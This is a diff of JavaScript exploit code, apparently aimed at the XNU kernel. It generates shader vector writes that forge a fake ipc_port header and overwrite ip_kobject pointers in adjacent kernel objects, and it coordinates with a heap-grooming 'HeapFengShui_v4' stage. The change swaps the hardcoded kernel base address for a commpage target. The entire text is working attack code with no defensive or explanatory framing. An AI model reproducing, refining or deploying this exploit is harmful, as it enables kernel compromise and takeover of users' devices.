@@ -80,8 +80,8 @@
      * uvec4 v[10]:  bytes 160..175 → kern_lo,kern_hi,kern_lo,kern_hi
      * Then repeat for 42 total uvec4s (covers ~4 adjacent icmp6pcb objects)
      */
-    var KERN_LO = 0x4d928000;
-    var KERN_HI = 0xfffffe00;  // Note: uint32, not signed
+    var COMM_LO = 0xFFFFC330;  // lower 32 bits of 0x0000000FFFFFC330 (Commpage target)
+    var COMM_HI = 0x0000000F;  // upper 32 bits
 
     /*
      * v[0] encodes fake ipc_port header (first 16 bytes):
@@ -109,8 +109,8 @@
         } else {
             // Alternate KERN_LO/KERN_HI pairs: encodes 64-bit kernel_base in each pair
             assignments += '    v[' + vi + '] = uvec4(' +
-                KERN_LO + 'u, ' + KERN_HI + 'u, ' +
-                KERN_LO + 'u, ' + KERN_HI + 'u);\n';
+                COMM_LO + 'u, ' + COMM_HI + 'u, ' +
+                COMM_LO + 'u, ' + COMM_HI + 'u);\n';
         }
     }
 
@@ -271,7 +271,7 @@
     // Start firing after 2s (let HeapFengShui_v4 set up ports)
     console.log('[v7] Starting in 2s...');
     console.log('[v7] v[0] writes io_bits=0x80000002 (IKOT_TASK) + io_refs=100');
-    console.log('[v7] v[1..41] write kernel_base=0xfffffe004d928000 into ip_kobject');
+    console.log('[v7] v[1..41] write commpage=0x0000000FFFFFC330 into ip_kobject');
     console.log('[v7] HeapFengShui_v4 must be running — detects kotype+kobject change');
     setTimeout(fireRound, 2000);
 
